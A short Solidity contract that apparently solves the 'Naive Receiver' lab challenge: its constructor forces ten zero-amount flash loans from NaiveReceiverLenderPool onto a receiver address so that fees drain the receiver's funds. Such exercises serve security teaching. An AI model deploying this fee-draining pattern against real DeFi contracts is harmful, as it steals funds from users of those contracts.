pragma solidity ^0.6.0;

// import "@openzeppelin/contracts/math/SafeMath.sol";
// import "@openzeppelin/contracts/utils/Address.sol";
import "./NaiveReceiverLenderPool.sol";

contract NaiveFlashLoan {

    NaiveReceiverLenderPool public pool;

    constructor(address payable rec, address payable poolAddr) public {
        pool = NaiveReceiverLenderPool(poolAddr);
        for (uint256 i = 0; i<10; i++){
            pool.flashLoan(rec, 0);
        }
    }
}